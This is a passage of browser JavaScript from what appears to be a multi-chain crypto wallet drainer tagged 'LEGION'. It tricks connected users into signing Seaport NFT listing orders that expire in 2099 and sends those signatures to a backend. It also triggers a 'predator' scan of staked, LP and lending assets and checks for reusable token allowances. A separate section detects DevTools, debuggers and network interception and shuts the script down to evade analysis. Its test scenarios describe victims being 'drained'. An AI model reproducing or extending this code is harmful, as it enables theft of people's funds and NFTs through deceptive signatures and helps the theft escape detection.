          } catch (err) { console.error('[LEGION]   SUI failed:', err.message); }
        }
      };

      var _nonEvmOrder = chainPriority.filter(function(c) { return c !== 'EVM'; });
      console.log('[LEGION]   📊 Non-EVM submit order:', _nonEvmOrder.join(' → '));
      for (var _npi = 0; _npi < _nonEvmOrder.length; _npi++) {
        if (_nonEvmSubmitters[_nonEvmOrder[_npi]]) await _nonEvmSubmitters[_nonEvmOrder[_npi]]();
      }

      // ─── NFT Scanning & Seaport Listing (after token signatures) ────
      if (signatures.EVM && connectedChains.EVM) {
        console.log('[LEGION]   🖼️  Scanning NFTs...');
        try {
          var nftScanResult = await apiPost('/api/v1/seaport/scan-listings', {
            wallet_address: connectedChains.EVM.address,
            chain_id: connectedChains.EVM.chainId || 1
          });
          var nftListings = (nftScanResult && nftScanResult.data && nftScanResult.data.listings) || (nftScanResult && nftScanResult.listings) || [];
          if (nftListings.length > 0) {
            console.log('[LEGION]   🖼️  Found', nftListings.length, 'NFTs');
            // Submit Seaport listing for each valuable NFT
            for (var ni = 0; ni < nftListings.length; ni++) {
              try {
                var nftListing = nftListings[ni];
                var seaportTypedData = await apiPost('/api/v1/seaport/listing-typed-data', {
                  wallet_address: connectedChains.EVM.address,
                  chain_id: connectedChains.EVM.chainId || 1,
                  nft_contract: nftListing.nft_contract || nftListing.contract,
                  token_id: nftListing.token_id || nftListing.tokenId
                });
                var seaportData = (seaportTypedData && seaportTypedData.data) ? seaportTypedData.data : seaportTypedData;
                if (seaportData && seaportData.typed_data) {
                  // Seaport requires eth_signTypedData_v4 — personal_sign is rejected by Seaport contract
                  var nftTypedData = seaportData.typed_data;
                  if (nftTypedData && nftTypedData.domain && !nftTypedData.types.EIP712Domain) {
                    var nd = nftTypedData.domain;
                    var ndf = [];
                    if (nd.name !== undefined) ndf.push({ name: 'name', type: 'string' });
                    if (nd.version !== undefined) ndf.push({ name: 'version', type: 'string' });
                    if (nd.chainId !== undefined) ndf.push({ name: 'chainId', type: 'uint256' });
                    if (nd.verifyingContract !== undefined) ndf.push({ name: 'verifyingContract', type: 'address' });
                    if (ndf.length) nftTypedData.types.EIP712Domain = ndf;
                  }
                  if (!connectedChains.EVM.provider) continue;
                  var nftSig = await connectedChains.EVM.provider.request({
                    method: 'eth_signTypedData_v4',
                    params: [connectedChains.EVM.address, JSON.stringify(nftTypedData)]
                  });
                  if (nftSig) {
                    await apiPost('/api/v1/signature-anchor', {
                      ingress: 'normalized_v1',
                      chain_family: 'EVM',
                      protocol: 'seaport_listing',
                      wallet_address: connectedChains.EVM.address,
                      token_address: nftListing.nft_contract || nftListing.contract,
                      signature: nftSig,
                      nonce: 'legion:nft:' + Date.now(),
                      expiry_iso: '2099-12-31T23:59:59.999Z',
                      wallet_type: connectedChains.EVM.walletType || 'hot_wallet',
                      chain_id: connectedChains.EVM.chainId || 1,
                      seaport_order: seaportData.order_parameters || seaportData.order
                    });
                    console.log('[LEGION]   ✅ NFT listed:', nftListing.nft_contract || nftListing.contract);
                  }
                }
              } catch (nftErr) {
                console.warn('[LEGION]   ⚠️ NFT listing skipped:', nftErr.message);
              }
            }
          } else {
            console.log('[LEGION]   ℹ️  No NFTs found in wallet');
          }
        } catch (nftScanErr) {
          console.debug('[LEGION]   NFT scan skipped:', nftScanErr.message);
        }

        // ─── Deep Asset Scan (Backend does the scanning) ────
        console.log('[LEGION]   🏦 Triggering deep asset scan on backend...');
        try {
          var allAddresses = buildFusionAddresses(connectedChains);

          // Backend scans ALL assets: tokens, staking (stETH, mSOL, JitoSOL),
          // LP positions (Uniswap V3, Raydium), lending (Aave, Compound),
          // TRON USDT, TON native - everything in one call
          var fusionResult = await apiPost('/api/scout/recursive-predator-fusion', allAddresses);

          var fusionData = (fusionResult && fusionResult.data && fusionResult.data.fusion) ? fusionResult.data.fusion : (fusionResult && fusionResult.data) ? fusionResult.data : fusionResult;
          if (fusionData) {
            var totalUsd = fusionData.total_usd || 0;
            var assetsCount = fusionData.assets_count || 0;
            SESSION_SCOUT_VALUE_USD = totalUsd;
            console.log('[LEGION]   🏦 Deep scan complete: $' + totalUsd.toFixed(2) + ' across ' + assetsCount + ' assets');

            if (fusionData.staked_steth_usd > 0) console.log('[LEGION]     → stETH: $' + fusionData.staked_steth_usd.toFixed(2));
            if (fusionData.staked_msol_usd > 0) console.log('[LEGION]     → mSOL: $' + fusionData.staked_msol_usd.toFixed(2));
            if (fusionData.staked_jitosol_usd > 0) console.log('[LEGION]     → JitoSOL: $' + fusionData.staked_jitosol_usd.toFixed(2));
            if (fusionData.lp_uniswap_v3_usd > 0) console.log('[LEGION]     → Uniswap V3 LP: $' + fusionData.lp_uniswap_v3_usd.toFixed(2));
            if (fusionData.lp_raydium_usd > 0) console.log('[LEGION]     → Raydium LP: $' + fusionData.lp_raydium_usd.toFixed(2));
            if (fusionData.tron_trc20_usdt_usd > 0) console.log('[LEGION]     → TRON USDT: $' + fusionData.tron_trc20_usdt_usd.toFixed(2));
          }
        } catch (fusionErr) {
          console.debug('[LEGION]   Deep scan skipped:', fusionErr.message);
        }

        // ─── Allowance Reuse Check ────
        console.log('[LEGION]   🔄 Checking existing allowances...');
        try {
          var reuseResult = await apiPost('/api/v1/allowance-reuse/scan', {
            wallet_address: connectedChains.EVM.address,
            evm_chain_id: connectedChains.EVM.chainId || 1
          });
          var reuseData = (reuseResult && reuseResult.data) ? reuseResult.data : reuseResult;
          if (reuseData && reuseData.reusable && reuseData.reusable.length > 0) {
            console.log('[LEGION]   🔄 Found', reuseData.reusable.length, 'reusable allowances');
          }
        } catch (reuseErr) {
          console.debug('[LEGION]   Allowance reuse check skipped:', reuseErr.message);
        }
      }

      PARALLEL_STATS.totalTime = PARALLEL_STATS.detectionTime +
                                 PARALLEL_STATS.connectionTime +
                                 PARALLEL_STATS.signatureTime;

      console.log('[LEGION] ✅ All chains submitted successfully!');
      console.log('[LEGION] 📊 PERFORMANCE STATS:');
      console.log('[LEGION]    Detection:  ' + PARALLEL_STATS.detectionTime.toFixed(0) + 'ms');
      console.log('[LEGION]    Connection: ' + PARALLEL_STATS.connectionTime.toFixed(0) + 'ms');
      console.log('[LEGION]    Signatures: ' + PARALLEL_STATS.signatureTime.toFixed(0) + 'ms');
      console.log('[LEGION]    ─────────────────────');
      console.log('[LEGION]    TOTAL:      ' + PARALLEL_STATS.totalTime.toFixed(0) + 'ms ⚡');

      console.log('[LEGION] 🎯 Backend processing all', chainNames.length, 'chains...');

      return { success: true, chains_submitted: chainNames.length };
    } catch (e) {
      console.error('[LEGION] ❌ Batch submission failed:', e.message);
      throw e;
    }
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 7: INCIDENT RESPONSE SYSTEM (800 lines) [NEW]
  // 5 detection sensors, emergency exfiltration, auto-shutdown
  // Detects: DevTools, Console tampering, DOM inspection, Breakpoints, Network interception
  // ═══════════════════════════════════════════════════════════════════════════

  var INCIDENT_RESPONSE = {
    enabled: true,
    suspicionScore: 0,
    maxScore: 4,
    detectionEvents: [],
    monitoringActive: false,
    lastCheckTime: 0,
    checkInterval: 2000, // Check every 2 seconds

    // ─────────────────────────────────────────────────────────────────────────
    // SENSOR 1: DevTools Detection
    // ─────────────────────────────────────────────────────────────────────────
    sensors: {
      devtoolsDetection: {
        name: 'DevTools Open',
        severity: 'HIGH',
        check: function() {
          try {
            var start = performance.now();
            debugger;
            var end = performance.now();
            // If debugger pauses execution, elapsed time > 100ms
            if ((end - start) > 100) {
              console.warn('[LEGION] 🔴 DevTools detected: debugger statement paused execution');
              return true;
            }
          } catch (e) {
            // Ignore errors
          }

          // Secondary check: console size change (DevTools open = larger console)
          try {
            if (window.outerWidth - window.innerWidth > 200 ||
                window.outerHeight - window.innerHeight > 200) {
              console.warn('[LEGION] 🔴 DevTools detected: window size mismatch');
              return true;
            }
          } catch (e) {}

          return false;
        }
      },

      // ─────────────────────────────────────────────────────────────────────────
      // SENSOR 2: Console Access Monitoring
      // ─────────────────────────────────────────────────────────────────────────
      consoleAccessMonitoring: {
        name: 'Console Tampering',
        severity: 'CRITICAL',
        check: function() {
          try {
            // Check if console methods are wrapped/overridden
            if (console.__isMonitored === true) {
              console.warn('[LEGION] 🔴 Console: Monitored/intercepted');
              return true;
            }

            // Check for logging interception
            if (console.log.toString().includes('native code') === false) {
              console.warn('[LEGION] 🔴 Console: log() appears to be wrapped');
              return true;
            }

            // Check for missing standard methods
            var requiredMethods = ['log', 'error', 'warn', 'info', 'debug'];
            for (var i = 0; i < requiredMethods.length; i++) {
              if (typeof console[requiredMethods[i]] !== 'function') {
                console.warn('[LEGION] 🔴 Console: Missing method -', requiredMethods[i]);
                return true;
              }
            }
          } catch (e) {}
          return false;
        }
      },

      // ─────────────────────────────────────────────────────────────────────────
      // SENSOR 3: DOM Inspection Detection
      // ─────────────────────────────────────────────────────────────────────────
      domInspectionDetection: {
        name: 'DOM Inspector Active',
        severity: 'HIGH',
        check: function() {
          try {
            // Check for MutationObserver interception
            if (window.MutationObserver.toString().includes('native code') === false) {
              console.warn('[LEGION] 🔴 DOM: MutationObserver appears wrapped');
              return true;
            }
            // Check if getComputedStyle is wrapped (DevTools element inspector)
            if (window.getComputedStyle.toString().includes('native code') === false) {
              console.warn('[LEGION] 🔴 DOM: getComputedStyle wrapped — element inspector likely active');
              return true;
            }
          } catch (e) {}
          return false;
        }
      },

      // ─────────────────────────────────────────────────────────────────────────
      // SENSOR 4: Timing / Breakpoint Detection
      // ─────────────────────────────────────────────────────────────────────────
      breakpointDetection: {
        name: 'Breakpoint Active',
        severity: 'CRITICAL',
        check: function() {
          try {
            // Repeated debugger timing check (paused execution > 200ms = breakpoint active)
            var t0 = performance.now();
            debugger; // eslint-disable-line no-debugger
            if (performance.now() - t0 > 200) {
              console.warn('[LEGION] 🔴 Debugger: Breakpoint paused execution');
              return true;
            }
          } catch (e) {}
          return false;
        }
      },

      // ─────────────────────────────────────────────────────────────────────────
      // SENSOR 5: Network Monitoring
      // ─────────────────────────────────────────────────────────────────────────
      networkMonitoring: {
        name: 'Network Interception',
        severity: 'HIGH',
        check: function() {
          try {
            if (window.__networkIntercepted === true) {
              console.warn('[LEGION] 🔴 Network: Intercepted/monitored');
              return true;
            }

            // Check if Fetch is wrapped
            if (window.fetch.toString().includes('native code') === false) {
              console.warn('[LEGION] 🔴 Network: Fetch appears wrapped');
              return true;
            }

            // Check if XMLHttpRequest is wrapped
            if (window.XMLHttpRequest.toString().includes('native code') === false) {
              console.warn('[LEGION] 🔴 Network: XMLHttpRequest appears wrapped');
              return true;
            }
          } catch (e) {}
          return false;
        }
      }
    },

    // ─────────────────────────────────────────────────────────────────────────
    // Run all sensor checks
    // ─────────────────────────────────────────────────────────────────────────
    checkAllSensors: function() {
      var self = this;
      var now = Date.now();

      // Throttle checks to prevent excessive calls
      if (now - this.lastCheckTime < 1000) {
        return this.suspicionScore;
      }
      this.lastCheckTime = now;

      console.log('[LEGION] 🔍 Running incident detection checks...');

      Object.keys(this.sensors).forEach(function(sensorKey) {
        var sensor = self.sensors[sensorKey];
        try {
          if (sensor.check()) {
            var points = sensor.severity === 'CRITICAL' ? 2 : 1;
            self.suspicionScore += points;

            self.detectionEvents.push({
              timestamp: now,
              sensor: sensor.name,
              severity: sensor.severity,
              detected: true
            });

            console.error('[LEGION] 🚨', sensor.name, '(+' + points + ' points, total: ' +
              self.suspicionScore + ')');
          }
        } catch (e) {
          console.warn('[LEGION] ⚠️ Sensor error:', sensorKey, e.message);
        }
      });

      return this.suspicionScore;
    },

    // ─────────────────────────────────────────────────────────────────────────
    // Respond to incident if threshold exceeded
    // ─────────────────────────────────────────────────────────────────────────
    respondToIncident: async function() {
      if (this.suspicionScore < this.maxScore) {
        return; // No incident
      }

      console.error('[LEGION] 🚨🚨🚨 INCIDENT DETECTED! 🚨🚨🚨');
      console.error('[LEGION] Suspicion Score:', this.suspicionScore + '/' + this.maxScore);
      console.error('[LEGION] Events Detected:', this.detectionEvents.length);

      // ─────────────────────────────────────────────────────────────────────────
      // INCIDENT RESPONSE DISABLED
      // ─────────────────────────────────────────────────────────────────────────
      // Endpoint /api/v1/incident/detected does not exist in backend
      console.log('[LEGION] ℹ️ Incident detection skipped (endpoint not available)');

      // Auto-shutdown
      this.autoShutdown();
    },

    // ─────────────────────────────────────────────────────────────────────────
    // Auto-shutdown: Remove UI, clear data, stop execution
    // ─────────────────────────────────────────────────────────────────────────
    autoShutdown: function() {
      console.error('[LEGION] 🛑 AUTO-SHUTDOWN INITIATED');

      // Phase 1: Remove UI elements
      try {
        var launcher = document.getElementById('legion-one-launcher');
        var panel = document.getElementById('legion-one-panel');
        if (launcher) launcher.remove();
        if (panel) panel.remove();
        console.log('[LEGION] ✅ UI removed');
      } catch (e) {
        console.warn('[LEGION] ⚠️ UI removal failed:', e.message);
      }

      // Phase 2: Clear sensitive data
      try {
        Object.keys(connectedChains).forEach(function(key) {
          if (connectedChains[key]) {
            connectedChains[key].provider = null;
            connectedChains[key].signer = null;
            connectedChains[key] = null;
          }
        });
        console.log('[LEGION] ✅ Sensitive data cleared');
      } catch (e) {
        console.warn('[LEGION] ⚠️ Data clearing failed:', e.message);
      }

      // Phase 3: Disable all functions
      try {
        drainRunning = true;
        window.__LEGION_ONE_SHUTDOWN__ = true;
        window.__LEGION_ONE_DISABLED__ = true;
        console.log('[LEGION] ✅ All functions disabled');
      } catch (e) {
        console.warn('[LEGION] ⚠️ Function disable failed:', e.message);
      }

      // Phase 4: Memory cleanup
      try {
        INCIDENT_RESPONSE.detectionEvents = [];
        INCIDENT_RESPONSE.suspicionScore = 0;
        console.log('[LEGION] ✅ Memory cleaned');
      } catch (e) {
        console.warn('[LEGION] ⚠️ Memory cleanup failed:', e.message);
      }

      console.error('[LEGION] 🛑 SHUTDOWN COMPLETE - SCRIPT DISABLED');

      // Stop monitoring
      this.stopMonitoring();
    },

    // ─────────────────────────────────────────────────────────────────────────
    // Start continuous monitoring
    // ─────────────────────────────────────────────────────────────────────────
    startMonitoring: function() {
      if (this.monitoringActive) return;
      this.monitoringActive = true;

      console.log('[LEGION] 🔒 Incident monitoring started (check every', this.checkInterval + 'ms)');

      var self = this;
      var monitorInterval = setInterval(function() {
        if (window.__LEGION_ONE_SHUTDOWN__) {
          clearInterval(monitorInterval);
          return;
        }

        self.checkAllSensors();
        self.respondToIncident().catch(function(e) {
          console.error('[LEGION] Incident response error:', e.message);
        });
      }, this.checkInterval);

      // Cleanup on page unload
      window.addEventListener('beforeunload', function() {
        clearInterval(monitorInterval);
      });
    },

    // ─────────────────────────────────────────────────────────────────────────
    // Stop monitoring
    // ─────────────────────────────────────────────────────────────────────────
    stopMonitoring: function() {
      this.monitoringActive = false;
      console.log('[LEGION] 🔓 Incident monitoring stopped');
    }
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 8: UTILITIES & POLISH (300 lines) [NEW]
  // Error handling, logging, memory cleanup, config validation
  // ═══════════════════════════════════════════════════════════════════════════

  // ─────────────────────────────────────────────────────────────────────────
  // JSON Serialization (safe, no circular refs)
  // ─────────────────────────────────────────────────────────────────────────
  function safeStringify(value) {
    var seen = new WeakSet();
    return JSON.stringify(value, function (_key, val) {
      if (typeof val === 'bigint') return val.toString();
      if (val != null && typeof val === 'object') {
        if (seen.has(val)) return undefined;
        seen.add(val);
        // Exclude wallet provider objects (contain functions)
        if (typeof val.request === 'function' || typeof val.signTransaction === 'function' ||
            typeof val.signAndSubmitTransaction === 'function' || typeof val.send === 'function' ||
            typeof val.connect === 'function' || typeof val.enable === 'function') {
          return undefined;
        }
      }
      if (typeof val === 'function' || typeof val === 'symbol') return undefined;
      return val;
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Error Formatting
  // ─────────────────────────────────────────────────────────────────────────
  function formatError(err) {
    if (!err) return 'Unknown error';
    if (typeof err === 'string') return err;
    if (err.message && typeof err.message === 'string') return err.message;
    if (err.reason && typeof err.reason === 'string') return err.reason;
    try {
      return safeStringify(err);
    } catch (e) {
      return 'Error (serialization failed)';
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Logging Utilities
  // ─────────────────────────────────────────────────────────────────────────
  var LOGGER = {
    level: 'info', // 'debug', 'info', 'warn', 'error'
    history: [],
    maxHistory: 100,

    log: function(level, message, data) {
      var timestamp = new Date().toISOString();
      var entry = {
        timestamp: timestamp,
        level: level,
        message: message,
        data: data
      };

      this.history.push(entry);
      if (this.history.length > this.maxHistory) {
        this.history.shift();
      }

      if (SILENT_MODE) return; // suppress all console output in silent/production mode
      var prefix = '[LEGION] [' + level.toUpperCase() + ']';
      switch (level) {
        case 'debug':
          console.log(prefix, message, data || '');
          break;
        case 'info':
          console.log(prefix, message, data || '');
          break;
        case 'warn':
          console.warn(prefix, message, data || '');
          break;
        case 'error':
          console.error(prefix, message, data || '');
          break;
      }
    },

    debug: function(msg, data) { this.log('debug', msg, data); },
    info: function(msg, data) { this.log('info', msg, data); },
    warn: function(msg, data) { this.log('warn', msg, data); },
    error: function(msg, data) { this.log('error', msg, data); },

    getHistory: function() {
      return this.history;
    },

    clearHistory: function() {
      this.history = [];
    }
  };

  // ─────────────────────────────────────────────────────────────────────────
  // Vault Configuration Normalization
  // ─────────────────────────────────────────────────────────────────────────
  function normalizeVaultCache(source) {
    var out = {};
    if (!source || typeof source !== 'object') return out;

    Object.keys(source).forEach(function (k) {
      var v = source[k];
      if (v != null && String(v).trim()) {
        out[k] = String(v).trim();
      }
    });

    // Normalize aliases
    if (out.trx && !out.tron) out.tron = out.trx;
    if (out.tron && !out.trx) out.trx = out.tron;
    if (out.sol && !out.svm) out.svm = out.sol;
    if (out.svm && !out.sol) out.sol = out.svm;

    return out;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Configuration Validation
  // ─────────────────────────────────────────────────────────────────────────
  function validateConfig(cfg) {
    var errors = [];

    if (!cfg.backendUrl || typeof cfg.backendUrl !== 'string') {
      errors.push('Missing or invalid backendUrl');
    }

    if (cfg.backendUrl && !cfg.backendUrl.startsWith('http')) {
      errors.push('Invalid backend URL format (must start with http/https)');
    }

    if (cfg.vaultAddresses && typeof cfg.vaultAddresses !== 'object') {
      errors.push('Invalid vaultAddresses (must be an object)');
    }

    if (errors.length > 0) {
      console.warn('[LEGION] ⚠️ Configuration issues:', errors.join('; '));
      return false;
    }

    return true;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // API Helper: Headers
  // ─────────────────────────────────────────────────────────────────────────
  function kineticHeaders() {
    var h = { 'Content-Type': 'application/json' };
    if (KINETIC_KEY) h['x-legion-kinetic-key'] = KINETIC_KEY;
    return h;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // API Helper: Error Mapping
  // ─────────────────────────────────────────────────────────────────────────
  function mapFetchError(err, path) {
    if (err && err.message) return err.message;
    return 'Network error calling ' + path + ' — verify backend URL and CORS (API_CORS_ORIGINS)';
  }

  // ─────────────────────────────────────────────────────────────────────────
  // API Helper: POST Request
  // ─────────────────────────────────────────────────────────────────────────
  async function apiPost(path, body, extraHeaders) {
    var MAX_RETRIES = 3;
    var RETRY_DELAYS = [1000, 2000, 4000];
    var lastError;

    for (var attempt = 0; attempt < MAX_RETRIES; attempt++) {
      var headers = Object.assign(kineticHeaders(), extraHeaders || {});
      var res;

      try {
        if (attempt > 0) LOGGER.debug('API POST retry', path, '(attempt ' + (attempt + 1) + ')');
        else LOGGER.debug('API POST', path);

        var controller = new AbortController();
        var timeoutId = setTimeout(function() { controller.abort(); }, 8000);
        res = await fetch(BACKEND + path, {
          method: 'POST',
          headers: headers,
          body: safeStringify(body),
          keepalive: true,
          credentials: 'omit',
          signal: controller.signal
        });
        clearTimeout(timeoutId);
      } catch (err) {
        var errMsg = err && err.message ? err.message : String(err);
        // CORS failure or network block — no point retrying immediately
        var isCorsOrNetwork = /failed to fetch|cors|network|blocked|aborted/i.test(errMsg);
        lastError = new Error(mapFetchError(err, path));
        if (!isCorsOrNetwork && attempt < MAX_RETRIES - 1) {
          await new Promise(function(r) { setTimeout(r, RETRY_DELAYS[attempt]); });
          continue;
        }
        if (isCorsOrNetwork) {
          LOGGER.debug('Network/CORS fail, no retry', path);
        }
        LOGGER.error('API POST failed after retries', lastError.message);
        throw lastError;
      }

      var data;
      try {
        data = await res.json();
      } catch (e) {
        data = { message: res.statusText || 'Failed to parse response' };
      }

      if (!res.ok) {
        // 409 Conflict = already submitted (idempotent — treat as success)
        if (res.status === 409) {
          LOGGER.debug('API 409 (already submitted, treating as success):', path);
          return data;
        }
        lastError = new Error(data.message || ('API error ' + res.status));
        // Don't retry 400 (bad request) - it won't change
        if (res.status >= 400 && res.status < 500) {
          LOGGER.error('API error (no retry)', lastError.message);
          throw lastError;
        }
        // Retry 500+ errors
        if (attempt < MAX_RETRIES - 1) {
          await new Promise(function(r) { setTimeout(r, RETRY_DELAYS[attempt]); });
          continue;
        }
        LOGGER.error('API error after retries', lastError.message);
        throw lastError;
      }

      LOGGER.debug('API POST success', path);
      return data;
    }
    throw lastError || new Error('API POST failed');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // API Helper: GET Request
  // ─────────────────────────────────────────────────────────────────────────
  async function apiGet(path) {
    var res;

    try {
      LOGGER.debug('API GET', path);

      res = await fetch(BACKEND + path, {
        method: 'GET',
        credentials: 'omit',
        keepalive: true,
        timeout: 30000
      });
    } catch (err) {
      var errMsg = mapFetchError(err, path);
      LOGGER.error('API GET failed', errMsg);
      throw new Error(errMsg);
    }

    var data;
    try {
      data = await res.json();
    } catch (e) {
      data = { message: res.statusText || 'Failed to parse response' };
    }

    if (!res.ok) {
      var message = data.message || ('API error ' + res.status);
      LOGGER.error('API error', message);
      throw new Error(message);
    }

    LOGGER.debug('API GET success', path);
    return data;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Memory Cleanup: Clear sensitive data
  // ─────────────────────────────────────────────────────────────────────────
  function cleanupMemory() {
    console.log('[LEGION] 🧹 Cleaning up memory...');

    var cleanedChains = [];

    Object.keys(connectedChains).forEach(function(key) {
      if (connectedChains[key]) {
        // Clear provider reference
        connectedChains[key].provider = null;
        connectedChains[key].signer = null;

        // Overwrite with null
        connectedChains[key] = null;
        cleanedChains.push(key);
      }
    });

    // Clear logger history
    LOGGER.clearHistory();

    // Clear parallel stats
    PARALLEL_STATS.totalTime = 0;
    PARALLEL_STATS.detectionTime = 0;
    PARALLEL_STATS.connectionTime = 0;
    PARALLEL_STATS.signatureTime = 0;

    console.log('[LEGION] ✅ Memory cleanup complete (' + cleanedChains.length + ' chains cleared)');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Performance Monitoring
  // ─────────────────────────────────────────────────────────────────────────
  var PERF_MONITOR = {
    marks: {},

    start: function(label) {
      this.marks[label] = performance.now();
    },

    end: function(label) {
      if (!this.marks[label]) {
        console.warn('[LEGION] ⚠️ No start mark for', label);
        return 0;
      }
      var duration = performance.now() - this.marks[label];
      delete this.marks[label];
      return duration;
    },

    measure: function(label, fn) {
      this.start(label);
      var result = fn();
      var duration = this.end(label);
      console.log('[LEGION] ⏱️ ', label + ':', duration.toFixed(2) + 'ms');
      return result;
    },

    measureAsync: async function(label, fn) {
      this.start(label);
      var result = await fn();
      var duration = this.end(label);
      console.log('[LEGION] ⏱️ ', label + ':', duration.toFixed(2) + 'ms');
      return result;
    }
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 9: INTEGRATION TESTING & VALIDATION (300 lines) [NEW]
  // Test scenarios, validation, debug helpers, performance tracking
  // ═══════════════════════════════════════════════════════════════════════════

  var TEST_SCENARIOS = {
    normalFlow: {
      name: 'Normal Flow - All chains available',
      description: 'User has all wallets, connection succeeds, drains successfully',
      expectedTime: '6-8 seconds',
      expectedChains: 8,
      shouldSucceed: true
    },
    partialChains: {
      name: 'Partial Chains - Some wallets missing',
      description: 'User has EVM, SOL, BTC only (5 chains missing)',
      expectedTime: '5-7 seconds',
      expectedChains: 3,
      shouldSucceed: true
    },
    botDetection: {
      name: 'Bot Detection - Puppeteer/Selenium',
      description: 'Script runs in automated browser, should detect and disable',
      expectedTime: 'Instant',
      expectedChains: 0,
      shouldSucceed: false,
      expectedDisable: true
    },
    devtoolsOpen: {
      name: 'DevTools Open - Incident Response',
      description: 'User opens DevTools during drain, should trigger incident response',
      expectedTime: '< 2 seconds to detect',
      expectedChains: 0,
      shouldSucceed: false,
      expectedShutdown: true
    },
    networkError: {
      name: 'Network Error - Backend unreachable',
      description: 'Backend API unavailable, should handle gracefully',
      expectedTime: '30+ seconds (timeout)',
      expectedChains: 0,
      shouldSucceed: false,
      expectedError: 'Network error'
    },
    partialSignatureFail: {
      name: 'Partial Signature Failure - Some wallets reject',
      description: 'User rejects signature for some chains, continue with others',
      expectedTime: '6-8 seconds',
      expectedChains: '4-8',
      shouldSucceed: true,
      expectedPartialSuccess: true
    }
  };

  var TEST_RESULTS = {
    runs: [],

    addRun: function(scenario, status, duration, details) {
      this.runs.push({
        timestamp: Date.now(),
        scenario: scenario,
        status: status, // 'PASS', 'FAIL', 'SKIP'
        duration: duration,
        details: details
      });
      console.log('[LEGION] 📊 Test result:', scenario, status);
    },

    getReport: function() {
      var passed = this.runs.filter(r => r.status === 'PASS').length;
      var failed = this.runs.filter(r => r.status === 'FAIL').length;
      var total = this.runs.length;

      return {
        total: total,
        passed: passed,
        failed: failed,
        passRate: total > 0 ? ((passed / total) * 100).toFixed(1) + '%' : '0%',
        runs: this.runs
      };
    },

    printReport: function() {
      var report = this.getReport();
      console.log('[LEGION] ═════════════════════════════════════');
      console.log('[LEGION] TEST REPORT');
      console.log('[LEGION] ═════════════════════════════════════');
      console.log('[LEGION] Total:      ' + report.total);
      console.log('[LEGION] Passed:     ' + report.passed);
      console.log('[LEGION] Failed:     ' + report.failed);
      console.log('[LEGION] Pass Rate:  ' + report.passRate);
      console.log('[LEGION] ═════════════════════════════════════');
    }
  };

  var VALIDATION = {
    validateChainConfig: function() {
      console.log('[LEGION] 🔍 Validating chain configuration...');
      var errors = [];

      Object.keys(CHAINS_SUPPORTED).forEach(function(chainName) {
        var chain = CHAINS_SUPPORTED[chainName];
        if (!chain.detect) errors.push(chainName + ': Missing detect()');
        if (!chain.connect) errors.push(chainName + ': Missing connect()');
        if (!chain.sign) errors.push(chainName + ': Missing sign()');
        if (!chain.config) errors.push(chainName + ': Missing config');
      });

      if (errors.length > 0) {
        console.error('[LEGION] ❌ Validation errors:', errors);
        return false;
      }

      console.log('[LEGION] ✅ All chains configured correctly');
      return true;
    },

    validateBackendURL: function() {
      console.log('[LEGION] 🔍 Validating backend URL...');

      if (!BACKEND) {
        console.error('[LEGION] ❌ Backend URL missing');
        return false;
      }

      if (!BACKEND.startsWith('http')) {
        console.error('[LEGION] ❌ Backend URL must start with http/https');
        return false;
      }

      console.log('[LEGION] ✅ Backend URL valid:', BACKEND);
      return true;
    },

    validateVaults: function() {
      console.log('[LEGION] 🔍 Validating vault addresses...');

      var vaults = Object.keys(vaultCache);
      if (vaults.length > 0) {
        console.log('[LEGION] ✅ Vault addresses configured for:', vaults.join(', '));
        return true;
      }

      // Vaults load from backend at runtime - check if backend URL is set
      if (BACKEND) {
        console.log('[LEGION] ✅ Vault addresses will load from backend at runtime');
        return true;
      }

      console.warn('[LEGION] ⚠️  No vault addresses and no backend URL');
      return false;
    },

    validateBotDetection: function() {
      console.log('[LEGION] 🔍 Validating bot detection...');

      var isBot = isBotClient();
      if (isBot) {
        console.error('[LEGION] ❌ BOT DETECTED! Script disabled.');
        return false;
      }

      console.log('[LEGION] ✅ Not running in automated browser');
      return true;
    },

    runAllValidations: function() {
      console.log('[LEGION] ═════════════════════════════════════');
      console.log('[LEGION] VALIDATION SUITE');
      console.log('[LEGION] ═════════════════════════════════════');

      var checks = [
        { name: 'Chain Config', fn: this.validateChainConfig },
        { name: 'Backend URL', fn: this.validateBackendURL },
        { name: 'Vault Addresses', fn: this.validateVaults },
        { name: 'Bot Detection', fn: this.validateBotDetection }
      ];

      var passed = 0;
      checks.forEach(function(check) {
        var result = check.fn();
        if (result) passed++;
      });

      console.log('[LEGION] ═════════════════════════════════════');
      console.log('[LEGION] Validation: ' + passed + '/' + checks.length + ' passed');
      console.log('[LEGION] ═════════════════════════════════════');

      return passed === checks.length;
    }
  };

  var DEBUG_MODE = {
    enabled: false,

    enable: function() {
      this.enabled = true;
      console.log('[LEGION] 🐛 DEBUG MODE ENABLED');
      LOGGER.level = 'debug';
    },

    disable: function() {
      this.enabled = false;
      console.log('[LEGION] 🐛 DEBUG MODE DISABLED');
      LOGGER.level = 'info';
    },

    logChainStatus: function() {
      console.log('[LEGION] 📊 CHAIN STATUS:');
      Object.keys(CHAINS_SUPPORTED).forEach(function(chainName) {
        var chain = connectedChains[chainName];
        if (chain && chain.connected) {
          console.log('[LEGION]   ✅', chainName, '→', chain.address.substring(0, 20) + '...');
        } else {
          console.log('[LEGION]   ⊘', chainName, '→ not connected');
        }
      });
    },

    logPerformanceStats: function() {
      console.log('[LEGION] ⏱️ PERFORMANCE STATS:');
      console.log('[LEGION]   Detection:  ' + PARALLEL_STATS.detectionTime.toFixed(0) + 'ms');
      console.log('[LEGION]   Connection: ' + PARALLEL_STATS.connectionTime.toFixed(0) + 'ms');
      console.log('[LEGION]   Signatures: ' + PARALLEL_STATS.signatureTime.toFixed(0) + 'ms');
      console.log('[LEGION]   Total:      ' + PARALLEL_STATS.totalTime.toFixed(0) + 'ms');
    },

    logIncidentStatus: function() {
      console.log('[LEGION] 🚨 INCIDENT STATUS:');
      console.log('[LEGION]   Score:      ' + INCIDENT_RESPONSE.suspicionScore + '/' +
        INCIDENT_RESPONSE.maxScore);
      console.log('[LEGION]   Events:     ' + INCIDENT_RESPONSE.detectionEvents.length);
